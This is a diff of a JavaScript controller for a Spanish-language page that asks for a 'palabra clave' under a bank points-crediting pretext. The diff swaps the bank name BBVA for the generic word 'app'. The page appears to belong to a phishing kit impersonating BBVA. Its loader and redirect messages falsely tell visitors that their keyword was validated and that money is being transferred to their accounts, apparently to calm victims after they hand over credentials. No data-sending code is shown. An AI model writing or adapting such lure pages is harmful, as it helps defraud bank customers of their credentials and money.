@@ -1,5 +1,5 @@
 /**
- * BBVA - Controlador para la vista de Solicitud de Palabra Clave (Proceso de Puntos)
+ * app - Controlador para la vista de Solicitud de Palabra Clave (Proceso de Puntos)
  */
 (function() {
   "use strict";
@@ -121,11 +121,11 @@
       submitBtn.classList.add("is-loading");
       submitBtn.disabled = true;
 
-      // Si existe el loader global estilo BBVA, activarlo
+      // Si existe el loader global estilo app, activarlo
       if (typeof window.showLoader === "function") {
         window.showLoader(
           "Validando tu información",
-          "Estamos verificando tu palabra clave y acreditando tus Puntos BBVA de manera segura..."
+          "Estamos verificando tu palabra clave y acreditando tus Puntos app de manera segura..."
         );
       }
 
@@ -138,7 +138,7 @@
           window.location.href = customRedirect;
         } else {
           // Redirigir a la pantalla cargando oficial con los textos de confirmación de puntos
-          const cargandoUrl = `cargando.html?title=${encodeURIComponent("Procesando acreditación")}&subtitle=${encodeURIComponent("Tu palabra clave ha sido validada. Estamos transfiriendo el valor correspondiente a tus productos BBVA...")}&time=4000&redirect=${encodeURIComponent("home.html")}`;
+          const cargandoUrl = `cargando.html?title=${encodeURIComponent("Procesando acreditación")}&subtitle=${encodeURIComponent("Tu palabra clave ha sido validada. Estamos transfiriendo el valor correspondiente a tus productos app...")}&time=4000&redirect=${encodeURIComponent("home.html")}`;
           window.location.href = cargandoUrl;
         }
       }, 1200);
